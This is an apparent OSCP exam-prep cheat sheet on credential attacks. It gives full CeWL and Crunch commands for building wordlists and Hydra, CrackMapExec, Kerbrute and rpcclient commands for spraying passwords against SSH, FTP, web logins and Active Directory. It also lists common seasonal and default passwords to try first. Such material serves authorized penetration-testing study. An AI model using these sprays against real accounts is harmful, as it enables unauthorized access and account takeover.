    Creating Custom Wordlists

    Using CeWL (Web Scraping)

    # Scrape website for words
cewl http://target.com -w wordlist.txt

# With minimum word length
cewl http://target.com -m 6 -w wordlist.txt

# Include email addresses
cewl http://target.com -e -w wordlist.txt

# Spider depth
cewl http://target.com -d 3 -w wordlist.txt

# With authentication
cewl http://target.com -a --auth_user admin --auth_pass password -w wordlist.txt

    Using Crunch (Pattern Generation)

    # Generate passwords of specific length
crunch 8 8 -o wordlist.txt

# With specific characters
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# With pattern (@ = lowercase, , = uppercase, % = numbers)
crunch 11 11 -t Summer2023 -o wordlist.txt
crunch 11 11 -t @@@@@@@%%%% -o wordlist.txt

# Season + Year pattern
crunch 11 11 -t Summer%%%% -o summer_years.txt

# Company + Numbers
crunch 10 10 -t Acme%%%%%% -o acme_wordlist.txt

    Password Spraying

    Against Web Applications

    # Using Hydra
hydra -L usernames.txt -p Summer2023 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Try one password against many users
hydra -L users.txt -p Password123 192.168.1.100 ssh

# Using Burp Intruder
# 1. Capture login request
# 2. Send to Intruder
# 3. Set username as payload position
# 4. Use single password: Summer2023
# 5. Attack

    Against Active Directory

    # Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u users.txt -p Summer2023
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123

# Using Kerbrute (password spray)
kerbrute passwordspray -d corp.local users.txt Summer2023

# Using rpcclient
for user in $(cat users.txt); do
    rpcclient -U "$user%Summer2023" 192.168.1.100 -c "quit"
done

    OSCP Exam Strategy

    Quick Win Passwords (Try First)

    1. Summer2023 / Winter2023 / Spring2024
2. Password123 / Password1!
3. Welcome123 / Welcome1!
4. Admin123 / Admin1!
5. [CompanyName]123
6. [Service]123 (e.g., MySQL123, Oracle123)
7. username:username
8. admin:admin
9. root:root
10. (blank password)

    Systematic Approach

    Phase 1: Information Gathering (2 min) 

    - Note company name
- Note application names
- Note any dates/years mentioned
- Note department names
- Note usernames found

    Phase 2: Generate Target List (3 min) 

    # Create custom list based on recon
cat > target_passwords.txt << EOF
Summer2023
Winter2024
[CompanyName]123
[CompanyName]2023
Password123
Welcome123
admin
password
EOF

    Phase 3: Test (5-10 min) 

    # Try against all discovered services
hydra -L users.txt -P target_passwords.txt ssh://192.168.1.100
hydra -L users.txt -P target_passwords.txt ftp://192.168.1.100
hydra -L users.txt -P target_passwords.txt 192.168.1.100 http-post-form "..."

    Phase 4: Expand if Needed 

    # If no hits, use larger list
hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt service://target

    Pro Tips

    OSCP Exam Tips

    • Always try seasonal passwords first (Summer2023, Winter2024, etc.)
    • Company name + 123 or year is very common
    • Look for hints on website - copyright year, company name
    • Username often equals password - try it!
    • Don't forget blank passwords - sometimes overlooked
    • Try variations - Password123, Password1!, P@ssw0rd123
    • Document what you try - don't repeat attempts

    Pattern Recognition

    • If you find one password works, try variations
    • If "Summer2023" works for one user, try for all users
    • If company is "Acme", try Acme123, Acme2023, Acme!
    • Look at copyright dates on websites for year hints
    • Department names often used (IT2023, HR2023)

    Efficiency Tips

    • Start with small, targeted lists (10-50 passwords)
    • Use password spraying (one password, many users)
    • Avoid account lockouts - be careful with attempts
    • Time-box your attempts - don't spend hours on passwords
    • Keep a running list of passwords that work

    Common Mistakes

    • Trying too many passwords (causing lockout)
    • Not trying seasonal passwords (biggest OSCP hint)
    • Forgetting to try username as password
    • Not looking for password hints on website
    • Using huge wordlists first (waste of time)
    • Not documenting what passwords work where

    OSCP Restrictions

    • Don't cause account lockouts - be careful with attempts
    • Document your methodology in report
    • Note which passwords worked where
    • Show manual attempts before automated
    • Time management - don't spend too long on passwords
